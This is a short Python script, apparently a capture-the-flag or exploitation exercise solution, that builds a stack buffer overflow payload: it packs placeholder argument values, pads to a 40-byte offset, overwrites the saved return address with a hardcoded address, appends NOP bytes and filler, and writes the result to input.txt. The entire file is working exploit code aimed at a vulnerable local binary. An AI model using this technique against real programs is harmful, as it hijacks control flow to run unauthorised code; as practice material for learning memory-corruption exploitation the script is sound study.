import struct


offset = 40
arg5 = 0xabcdefed
arg4 = 0x12345678
arg3 = 0x13333337
arg2 = 0xbeeeeeef
arg1 = 0xcafebabe
arg0 = 0xdeadbeef
RIP = 0x00000000004011d8


# From parts 28 - 40 are where we will write the values for params
payload = struct.pack("<Q", arg5)
payload += struct.pack("<Q", arg4)
payload += struct.pack("<Q", arg3)
payload += struct.pack("<Q", arg2)
payload += struct.pack("<Q", arg1)
# payload += struct.pack("<Q", arg0)
payload += b"A" * (40 - len(payload))
payload += struct.pack("<Q", RIP)
payload += b"\x90\x90\x90\x90\x90"


payload += b"C" * (200 - len(payload))

f = open("input.txt", "wb")
f.write(payload)
